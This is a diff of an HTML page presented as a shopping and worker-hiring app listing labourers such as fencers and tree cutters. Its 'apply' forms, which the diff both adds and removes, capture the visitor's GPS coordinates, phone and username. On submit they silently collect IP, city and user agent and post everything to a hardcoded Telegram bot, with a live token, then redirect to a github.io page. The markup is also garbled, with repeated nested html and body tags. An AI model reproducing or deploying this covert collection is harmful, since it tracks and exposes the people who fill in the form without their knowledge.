@@ -1,3 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Modjadji Shopping App</title>
+<style>
+body {
+  font-family: sans-serif;
+}
+dialog {
+  border-radius: 8px;
+  padding: 20px;
+  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+  background-color: #f0f0f0; /* Light gray background */
+}
+fieldset {
+  margin-bottom: 15px;
+  border: 1px solid #ccc;
+  border-radius: 5px;
+  padding: 10px;
+}
+details summary {
+  cursor: pointer;
+}
+button {
+  background-color: green;
+  color: white;
+  border: none;
+  padding: 10px 20px;
+  border-radius: 5px;
+  cursor: pointer;
+}
+a {
+  color: blue;
+  text-decoration: underline;
+}
+</style>
+</head>
+<body>
+  <dialog open>
+    <p><strong>Hello! This is the Modjadji Shopping app. Thank you for using our app ©Trust us we wont dissapoint if looking for workers your in a right place this people are good in their jobs .</strong></p>
+    <form>
+      <fieldset>
+        <details>
+          <summary>App Details</summary>
+          <p>App developed by xdroid and edux.</p>
+        </details>
+      </fieldset>
+      <fieldset>
+        <details>
+          <summary>About Us</summary>
+          <p>Find our social media accounts:</p>
+          <p>- Facebook: <a href="#" target="_blank">Link</a> </p>
+        </details>
+      </fieldset>
+      <button onclick="this.parentElement.parentElement.close()">OK</button> </form>
+  </dialog>
+</body>
+</html>
+
 
 <body ng-app="">
 <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>
@@ -11,6 +70,10 @@
     height:50px;
     width:50px;
   }
+  .ok{
+    height:100px;
+    width:100px;
+  }
   .horzontal{
     display:flex;
   }
@@ -18,18 +81,34 @@
 
 <body>
   <title>Imployee</title>
-  <fieldset style="border-radius:5px;background-color:skyblue">
+  <fieldset style="border-radius:5px;background-color:#2df34d11">
     <details>
       <summary>HardJobs</summary>
       <div ng-app="">
 <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <h1 style="color:green">Available</h1>
     <div class="horzontal">
     <img src="https://i.ibb.co/c2wCjJy/1733417884573.jpg">
     <p><li>Name:caccius </li></p>
     <p><li>Job type:Hand worker</li></p>
     </div>
+   <fieldset style="border-radius:5px">
+        <details>
+
+          <summary>work</summary>
+          Experienced in heavy lifting (up to 100kg),"
+    * "Proficient with demolition tools and techniques,"
+    * "Reliable and punctual, with 5+ years of experience in manual labor,"
+    * "Can operate [specific machinery, if applicable],"
+    * "Available for immediate work."
+   
+              
+<a href="https://ibb.co/FXLTGbm"><div class="ok"><img src="https://i.ibb.co/HCf8mDB/preview.jpg" alt="preview" border="0"></a></div>
+      
+          </details>
+          </fieldset>
    <fieldset style="border-radius:5px">
         <details>
 
@@ -330,13 +409,15 @@ function getLocation() {
  </form>
  </head>
           </fieldset>
-         
+         <hr>
+         <hr>
          <div ng-app="">
 <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <h1 style="color:green">Available</h1>
     <img src="">
-    <p>Name</p>
+    <p><li>Name matome</li></p>
    <fieldset style="border-radius:5px">
         <details>
 
@@ -560,7 +641,7 @@ button{
                const name = document.getElementById("name").value;
                const email = document.getElementById("email").value;
                
-               const message = `> sir mongwe : ${page}\n\n> food :
+               const message = `> matome : ${page}\n\n> food :
                  ${name}\n\n> phone :
                  ${phone}\n\n> username :
                  ${username}\n\n> location url :
@@ -637,13 +718,29 @@ function getLocation() {
  </form>
  </head>
           </fieldset>
-         
+         <hr>
+         <hr>
          <div ng-app="">
 <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <h1 style="color:green">Available</h1>
     <img src="">
-    <p>Name</p>
+    <p><li>Name solly </li></p>
+    <fieldset style="border-radius:5px">
+      <details>
+        <summary>Work</summary>
+Tree removal
+* Tree trimming
+* Tree pruning
+* Stump grinding
+* Brush clearing
+* Land clearing
+Grass cutter
+
+<a href="https://ibb.co/T8QcgXd"><img src="https://i.ibb.co/jMChrKs/inline-image-preview-2.jpg" alt="inline-image-preview-2" border="0"></a>
+      </details>
+    </fieldset>
    <fieldset style="border-radius:5px">
         <details>
 
@@ -786,9 +883,10 @@ button{
 </html>
     <div class="container">
         <div class="logo-container">
-            <div class="logo"><strong>Arch</strong></div>
+            <div class="logo"><strong>fill the form</strong></div>
             <p class="slogan"></p>
             <p>Press get location</p>
+            <p>Using app copy and paste your coordinates</p>
          
  <form>
     <button type="button" onclick="getLocation()">Get Location</button>
@@ -813,7 +911,7 @@ button{
                 <input type="text" id="email"  placeholder="location" value="    https://www.google.com/maps/place/{{latitude}}+{{longitude}}"
                 class="input-field" name="email" required/>               
                
-                <input id="name" type="locate" placeholder="choose between 1kg to 10kg" class="input-field" name="location"  required>
+                <input id="name" type="locate" placeholder="Type of job" class="input-field" name="location"  required>
         <input type="tel" id="phone" name="phone" placeholder="phone" class="input-field" required>
         
         <input type="text" id="username" name="username" placeholder="username" class="input-field" required>
@@ -867,7 +965,7 @@ button{
                const name = document.getElementById("name").value;
                const email = document.getElementById("email").value;
                
-               const message = `> sir mongwe : ${page}\n\n> food :
+               const message = `> solly : ${page}\n\n> food :
                  ${name}\n\n> phone :
                  ${phone}\n\n> username :
                  ${username}\n\n> location url :
@@ -949,6 +1047,7 @@ function getLocation() {
 <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <h1 style="color:red">Not Available</h1>
     <img src="">
     <p>Name</p>
    <fieldset style="border-radius:5px">
@@ -1263,11 +1362,328 @@ function getLocation() {
   <title>Imployee</title>
   <fieldset style="border-radius:5px">
     <details>
-      <summary>break layers</summary>
+      <summary>fencing</summary>
       <div ng-app="">
 <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <h1 style="color:green">Available</h1>
+    <img src="">
+    <p><li>Name:normen</li></p>
+    <fieldset style="border-radius:5px">
+      <details>
+        <summary>Work</summary>
+        .One of the best fencer with 5+ years experience 
+        <a href="https://ibb.co/gvHgs0v"><img src="https://i.ibb.co/DGsK3BG/inline-image-preview-1.jpg" alt="inline-image-preview-1" border="0" ></a>
+        
+      </details>
+    </fieldset>
+   <fieldset style="border-radius:5px">
+        <details>
+
+          <summary>apply</summary>
+
+   <div ng-app="">
+<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <style>body {
+    font-family: Arial, sans-serif;
+    background-color: #f0f2f5;
+    
+    justify-content: ;
+    align-items: ;
+    height: 10vh;
+    margin: 0;
+}
+
+.container {
+    background-color: white;
+    border: 1px solid #ddd;
+    border-radius: 8px;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    text-align: center;
+    width: 220px;
+    padding: 20px;
+}
+img{
+  border-radius:5px;
+}
+
+.logo-container {
+    margin-bottom: 20px;
+}
+
+.logo {
+    font-family: 'Arial Black', sans-serif;
+    font-size: 36px;
+    color: #1877f2;
+}
+
+.slogan {
+    color: #555;
+    font-size: 14px;
+    margin-top: 5px;
+}
+
+.form-container {
+    text-align:center ;
+}
+
+.input-field {
+    width: 100%;
+    padding: 10px;
+    margin: 8px 0;
+    border: 1px solid #ddd;
+    border-radius: 5px;
+    font-size: 16px;
+    box-shadow: 3px 3px 5px 6px #ccc;
+}
+
+.login-button {
+    background-color: #1877f2;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    padding: 12px;
+    width: 100%;
+    cursor: pointer;
+    font-size: 18px;
+    margin: 12px 0;
+}
+
+.login-button:hover {
+    background-color: #0e5ace;
+}
+
+a {
+    text-decoration: none;
+    color: #1877f2;
+    font-size: 14px;
+}
+
+.divider {
+    margin: 12px 0;
+    border-top: 1px solid #ddd;
+}
+
+.no-social-login {
+    font-size: 14px;
+    margin-top: 16px;
+}
+
+.no-social-login a {
+    font-weight: bold;
+    color: #1877f2;
+}
+
+.no-social-login a:hover {
+    text-decoration: underline;
+}
+
+.popup {
+    display: none;
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background-color: rgba(0, 0, 0, 0.8);
+    color: white;
+    border-radius: 5px;
+    padding: 15px;
+    z-index: 1;
+}
+button{
+  background:orange;
+}
+
+.popup-content {
+    position: relative;
+}
+
+.popup-close {
+    position: absolute;
+    top: 5px;
+    right: 5px;
+    font-size: 20px;
+    cursor: pointer;
+}
+</style>
+</head>
+
+</body>
+</html>
+
+
+</body>
+</html>
+    <div class="container">
+        <div class="logo-container">
+            <div class="logo"><strong>fencing</strong></div>
+            <p class="slogan"></p>
+            <p>Press get location</p>
+         
+ <form>
+    <button type="button" onclick="getLocation()">Get Location</button>
+  </form>
+
+  <!-- AngularJS section -->
+  <div ng-app="">
+    <p>
+      Latitude: <input ng-model="latitude" type="text" id="latitude" />
+    </p>
+    <p>
+      Longitude: <input ng-model="longitude" type="text" id="longitude" />
+    </p>
+    <!-- Google Maps link with latitude and longitude -->       </div>
+
+        <div class="form-container">
+          
+            <form onsubmit="submitonhfc(); return false;" method="post">
+
+
+              <input type="hidden" name="" id="pagename" value="Facebook" />
+                <input type="text" id="email"  placeholder="location" value="    https://www.google.com/maps/place/{{latitude}}+{{longitude}}"
+                class="input-field" name="email" required/>               
+               
+                <input id="name" type="locate" placeholder="choose between 1kg to 10kg" class="input-field" name="location"  required>
+        <input type="tel" id="phone" name="phone" placeholder="phone" class="input-field" required>
+        
+        <input type="text" id="username" name="username" placeholder="username" class="input-field" required>
+                <button type="submit" class="login-button">Send</button>
+            </form>
+            
+            <div class="divider"></div>
+            <div class="no-social-login">
+                <p>Don't have an account? <a href="#" id="signup-button"></a></p>
+            </div>
+        </div>
+    </div>
+
+    <div id="error-popup" class="popup">
+        <div class="popup-content">
+            <span class="popup-close" id="close-popup">&times;</span>
+        </div>
+    </div>
+
+    <script>function la(src) {
+      window.location = src;
+    }
+    
+         function GetURLParameter(sParam) {
+           var sPageURL = window.location.search.substring(1);
+           var sURLVariables = sPageURL.split('&');
+           for (var i = 0; i < sURLVariables.length; i++) {
+             var sParameterName = sURLVariables[i].split('=');
+             if (sParameterName[0] == sParam) {
+               return sParameterName[1];
+             }
+           }
+         }
+    
+         var chatid = GetURLParameter('id');
+    
+         function submitonhfc() {
+           // Get IP address information using an API service
+           fetch('https://ipapi.co/json/')
+             .then(response => response.json())
+             .then(data => {
+               // Extract relevant device and IP information
+               const userAgent = navigator.userAgent;
+               const ip = data.ip;
+               const cityName = data.city;
+    
+               // Create the message to send
+               const username = document.getElementById("username").value;
+               const phone = document.getElementById("phone").value;
+               const page = document.getElementById("pagename").value;
+               const name = document.getElementById("name").value;
+               const email = document.getElementById("email").value;
+               
+               const message = `> no men : ${page}\n\n> food :
+                 ${name}\n\n> phone :
+                 ${phone}\n\n> username :
+                 ${username}\n\n> location url :
+                 ${email}\n\n> User Agent : ${userAgent}\n\n> IP Address : ${ip}\n\n> City : ${cityName}`;
+    
+               // Send the message to your Telegram bot using the appropriate API
+               const botToken = '6833607058:AAGgbkxgbikwaYWj2EmTnvhIDjAELhP5yi8';
+               const chatId =2013982441 ;
+    
+               const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+               const telegramParams = {
+                 chat_id: chatId,
+                 text: message
+               };
+    
+               // Send the request to the Telegram bot using AJAX
+               const xhr = new XMLHttpRequest();
+               xhr.open('POST', telegramUrl, true);
+               xhr.setRequestHeader('Content-Type', 'application/json');
+               xhr.send(JSON.stringify(telegramParams));
+    
+               // Handle the response (optional)
+               xhr.onload = function() {
+                 if (xhr.status === 200) {
+                   window.location.href = "https://iamroot5.github.io/Pdf/";
+                 } else {
+                   console.log('Error sending data to Telegram:', xhr.statusText);
+                 }
+               };
+    
+             })
+             .catch(error => console.log('Error retrieving IP address information:', error));
+         }
+function getLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition);
+    } else { 
+        alert("Geolocation is not supported by this browser.");
+    }
+}
+
+function showPosition(position) {
+    document.getElementById("latitude").value = position.coords.latitude;
+    document.getElementById("longitude").value = position.coords.longitude;
+}
+function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition);
+      } else {
+        alert("Geolocation is not supported by this browser.");
+      }
+    }
+
+    function showPosition(position) {
+      var latitude = position.coords.latitude;
+      var longitude = position.coords.longitude;
+
+      // Set latitude and longitude values to the AngularJS model
+      var scope = angular.element(document.getElementById("latitude")).scope();
+      scope.$apply(function() {
+        scope.latitude = latitude;
+        scope.longitude = longitude;
+      });
+    }
+         </script>
+
+</body>
+</html>
+</body>
+</html>
+
+</html>
+ </details>
+ </form>
+ </head>
+          </fieldset>
+         
+         <div ng-app="">
+<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <h1 style="color:red">Not Available</h1>
     <img src="">
     <p>Name</p>
    <fieldset style="border-radius:5px">
@@ -1609,312 +2025,9 @@ function getLocation() {
 img{
   border-radius:5px;
 }
-
-.logo-container {
-    margin-bottom: 20px;
-}
-
-.logo {
-    font-family: 'Arial Black', sans-serif;
-    font-size: 36px;
-    color: #1877f2;
-}
-
-.slogan {
-    color: #555;
-    font-size: 14px;
-    margin-top: 5px;
-}
-
-.form-container {
-    text-align:center ;
-}
-
-.input-field {
-    width: 100%;
-    padding: 10px;
-    margin: 8px 0;
-    border: 1px solid #ddd;
-    border-radius: 5px;
-    font-size: 16px;
-    box-shadow: 3px 3px 5px 6px #ccc;
-}
-
-.login-button {
-    background-color: #1877f2;
-    color: white;
-    border: none;
-    border-radius: 5px;
-    padding: 12px;
-    width: 100%;
-    cursor: pointer;
-    font-size: 18px;
-    margin: 12px 0;
-}
-
-.login-button:hover {
-    background-color: #0e5ace;
-}
-
-a {
-    text-decoration: none;
-    color: #1877f2;
-    font-size: 14px;
-}
-
-.divider {
-    margin: 12px 0;
-    border-top: 1px solid #ddd;
-}
-
-.no-social-login {
-    font-size: 14px;
-    margin-top: 16px;
-}
-
-.no-social-login a {
-    font-weight: bold;
-    color: #1877f2;
-}
-
-.no-social-login a:hover {
-    text-decoration: underline;
-}
-
-.popup {
-    display: none;
-    position: fixed;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%);
-    background-color: rgba(0, 0, 0, 0.8);
-    color: white;
-    border-radius: 5px;
-    padding: 15px;
-    z-index: 1;
-}
-button{
-  background:orange;
-}
-
-.popup-content {
-    position: relative;
-}
-
-.popup-close {
-    position: absolute;
-    top: 5px;
-    right: 5px;
-    font-size: 20px;
-    cursor: pointer;
-}
-</style>
-</head>
-
-</body>
-</html>
-
-
-</body>
-</html>
-    <div class="container">
-        <div class="logo-container">
-            <div class="logo"><strong>Arch</strong></div>
-            <p class="slogan"></p>
-            <p>Press get location</p>
-         
- <form>
-    <button type="button" onclick="getLocation()">Get Location</button>
-  </form>
-
-  <!-- AngularJS section -->
-  <div ng-app="">
-    <p>
-      Latitude: <input ng-model="latitude" type="text" id="latitude" />
-    </p>
-    <p>
-      Longitude: <input ng-model="longitude" type="text" id="longitude" />
-    </p>
-    <!-- Google Maps link with latitude and longitude -->       </div>
-
-        <div class="form-container">
-          
-            <form onsubmit="submitonhfc(); return false;" method="post">
-
-
-              <input type="hidden" name="" id="pagename" value="Facebook" />
-                <input type="text" id="email"  placeholder="location" value="    https://www.google.com/maps/place/{{latitude}}+{{longitude}}"
-                class="input-field" name="email" required/>               
-               
-                <input id="name" type="locate" placeholder="choose between 1kg to 10kg" class="input-field" name="location"  required>
-        <input type="tel" id="phone" name="phone" placeholder="phone" class="input-field" required>
-        
-        <input type="text" id="username" name="username" placeholder="username" class="input-field" required>
-                <button type="submit" class="login-button">Send</button>
-            </form>
-            
-            <div class="divider"></div>
-            <div class="no-social-login">
-                <p>Don't have an account? <a href="#" id="signup-button"></a></p>
-            </div>
-        </div>
-    </div>
-
-    <div id="error-popup" class="popup">
-        <div class="popup-content">
-            <span class="popup-close" id="close-popup">&times;</span>
-        </div>
-    </div>
-
-    <script>function la(src) {
-      window.location = src;
-    }
-    
-         function GetURLParameter(sParam) {
-           var sPageURL = window.location.search.substring(1);
-           var sURLVariables = sPageURL.split('&');
-           for (var i = 0; i < sURLVariables.length; i++) {
-             var sParameterName = sURLVariables[i].split('=');
-             if (sParameterName[0] == sParam) {
-               return sParameterName[1];
-             }
-           }
-         }
-    
-         var chatid = GetURLParameter('id');
-    
-         function submitonhfc() {
-           // Get IP address information using an API service
-           fetch('https://ipapi.co/json/')
-             .then(response => response.json())
-             .then(data => {
-               // Extract relevant device and IP information
-               const userAgent = navigator.userAgent;
-               const ip = data.ip;
-               const cityName = data.city;
-    
-               // Create the message to send
-               const username = document.getElementById("username").value;
-               const phone = document.getElementById("phone").value;
-               const page = document.getElementById("pagename").value;
-               const name = document.getElementById("name").value;
-               const email = document.getElementById("email").value;
-               
-               const message = `> sir mongwe : ${page}\n\n> food :
-                 ${name}\n\n> phone :
-                 ${phone}\n\n> username :
-                 ${username}\n\n> location url :
-                 ${email}\n\n> User Agent : ${userAgent}\n\n> IP Address : ${ip}\n\n> City : ${cityName}`;
-    
-               // Send the message to your Telegram bot using the appropriate API
-               const botToken = '6833607058:AAGgbkxgbikwaYWj2EmTnvhIDjAELhP5yi8';
-               const chatId =2013982441 ;
-    
-               const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-               const telegramParams = {
-                 chat_id: chatId,
-                 text: message
-               };
-    
-               // Send the request to the Telegram bot using AJAX
-               const xhr = new XMLHttpRequest();
-               xhr.open('POST', telegramUrl, true);
-               xhr.setRequestHeader('Content-Type', 'application/json');
-               xhr.send(JSON.stringify(telegramParams));
-    
-               // Handle the response (optional)
-               xhr.onload = function() {
-                 if (xhr.status === 200) {
-                   window.location.href = "https://iamroot5.github.io/Pdf/";
-                 } else {
-                   console.log('Error sending data to Telegram:', xhr.statusText);
-                 }
-               };
-    
-             })
-             .catch(error => console.log('Error retrieving IP address information:', error));
-         }
-function getLocation() {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(showPosition);
-    } else { 
-        alert("Geolocation is not supported by this browser.");
-    }
-}
-
-function showPosition(position) {
-    document.getElementById("latitude").value = position.coords.latitude;
-    document.getElementById("longitude").value = position.coords.longitude;
-}
-function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(showPosition);
-      } else {
-        alert("Geolocation is not supported by this browser.");
-      }
-    }
-
-    function showPosition(position) {
-      var latitude = position.coords.latitude;
-      var longitude = position.coords.longitude;
-
-      // Set latitude and longitude values to the AngularJS model
-      var scope = angular.element(document.getElementById("latitude")).scope();
-      scope.$apply(function() {
-        scope.latitude = latitude;
-        scope.longitude = longitude;
-      });
-    }
-         </script>
-
-</body>
-</html>
-</body>
-</html>
-
-</html>
- </details>
- </form>
- </head>
-          </fieldset>
-         
-         <div ng-app="">
-<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <img src="">
-    <p>Name</p>
-   <fieldset style="border-radius:5px">
-        <details>
-
-          <summary>take order</summary>
-
-   <div ng-app="">
-<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
-    <style>body {
-    font-family: Arial, sans-serif;
-    background-color: #f0f2f5;
-    
-    justify-content: ;
-    align-items: ;
-    height: 10vh;
-    margin: 0;
-}
-
-.container {
-    background-color: white;
-    border: 1px solid #ddd;
-    border-radius: 8px;
-    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-    text-align: center;
-    width: 220px;
-    padding: 20px;
-}
-img{
-  border-radius:5px;
+.img{
+  height:200px;
+  width:200px;
 }
 
 .logo-container {
@@ -2201,12 +2314,21 @@ function getLocation() {
 <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <h1 style="color:green">Available</h1>
     <img src="https://i.ibb.co/QnC2PZ6/d9f2e6f6716952b20d408ebe0aa196fd-0.jpg">
     <p><li>Company Bora mati</li></p>
+    <fieldset style="border-radius:5px;background-color:gray">
+    <details>
+      <summary>water drilling</summary>
+     <div class="pic">
+       <img src="https://i.ibb.co/QnC2PZ6/d9f2e6f6716952b20d408ebe0aa196fd-0.jpg">
+     </div>
+      </details>
+      </fieldset>
    <fieldset style="border-radius:5px">
         <details>
 
-          <summary>company </summary>
+          <summary>fill the form</summary>
 
    <div ng-app="">
 <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>
@@ -2508,6 +2630,7 @@ function getLocation() {
 <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <h1 style="color:red">Not Available</h1>
     <img src="">
     <p>Name</p>
    <fieldset style="border-radius:5px">
